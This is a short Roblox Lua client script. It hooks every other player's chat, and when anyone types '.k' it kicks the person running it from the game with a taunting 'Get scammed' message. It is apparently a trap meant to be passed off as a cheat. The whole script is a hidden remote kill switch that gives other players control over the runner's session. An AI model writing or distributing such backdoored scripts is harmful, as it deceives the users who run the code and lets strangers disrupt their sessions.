

local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer

local function hookPlayer(player)
    player.Chatted:Connect(function(msg)
        if msg:lower() == ".k" then

            localPlayer:Kick("Get scammed poopy pants hacker")
        end
    end)
end


for _, player in ipairs(Players:GetPlayers()) do
    if player ~= localPlayer then
        hookPlayer(player)
    end
end

Players.PlayerAdded:Connect(function(player)
    if player ~= localPlayer then
        hookPlayer(player)
    end
end)
